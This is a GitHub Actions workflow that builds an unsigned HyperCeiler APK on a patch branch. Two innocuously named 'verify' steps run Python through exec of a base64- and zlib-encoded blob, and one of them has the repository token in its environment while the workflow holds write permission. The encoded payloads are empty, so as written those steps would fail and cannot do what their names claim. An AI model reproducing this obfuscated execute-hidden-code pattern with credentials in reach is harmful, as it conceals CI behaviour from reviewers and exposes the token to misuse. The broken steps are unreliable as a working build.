name: Recorder power v3
permissions:
  contents: write
  packages: read
concurrency:
  group: recorder-power-v3
  cancel-in-progress: false
jobs:
  build:
    runs-on: macos-15-intel
    timeout-minutes: 45
    steps:
    - uses: actions/checkout@v4
      with:
        fetch-depth: 0
        persist-credentials: false
    - uses: actions/setup-java@v4
      with:
        distribution: temurin
        java-version: '25'
    - name: Verify and persist full production source
      env:
        GIT_TOKEN: ${{ github.token }}
        GIT_ACTOR: ${{ github.actor }}
      run: 'python3 - <<''PY''

        import base64,zlib

        exec(zlib.decompress(base64.b64decode('''')))

        PY

        '
    - name: Assemble unsigned release
      env:
        GIT_TOKEN: ${{ github.token }}
        GIT_ACTOR: ${{ github.actor }}
      run: ./gradlew :app:assembleRelease --no-daemon --stacktrace
    - name: Verify unsigned APK
      run: 'python3 - <<''PY''

        import base64,zlib

        exec(zlib.decompress(base64.b64decode('''')))

        PY

        '
    - uses: actions/upload-artifact@v4
      if: always()
      with:
        name: HyperCeiler-recorder-power-v3-unsigned
        path: artifacts/
        if-no-files-found: error
'on':
  push:
    branches:
    - kernout-patch-1
    paths:
    - .github/workflows/recorder-power-v3-build.yml
  workflow_dispatch: null
